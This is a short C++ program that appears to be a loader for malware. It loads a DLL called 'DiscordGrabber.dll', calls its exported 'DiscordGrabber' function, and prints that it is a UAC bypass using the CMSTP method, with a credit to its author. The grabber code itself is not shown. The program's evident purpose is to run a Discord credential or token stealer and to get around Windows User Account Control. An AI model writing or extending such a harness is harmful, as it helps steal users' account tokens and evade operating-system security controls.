#include <Windows.h>
#include <iostream>

int main()
{
	HMODULE DiscordGrabberDLL = LoadLibraryW(L"DiscordGrabber.dll");


	if (!DiscordGrabberDLL)
	{
		std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
		return 1;
	}


	auto func = (void(*)())GetProcAddress(DiscordGrabberDLL, "DiscordGrabber");

	if(!func)
	{
		std::cerr << "Failed to find function: " << GetLastError() << std::endl;
		return 1;
	}
	



	std::cout << "This Uac Bypass is using well known method CMSTP" << "\n";
	std::cout << "This example was created by : pieczywosoleckie " << std::endl;

	func();

	std::cin.get();

	FreeLibrary(DiscordGrabberDLL);
	return 0;
}
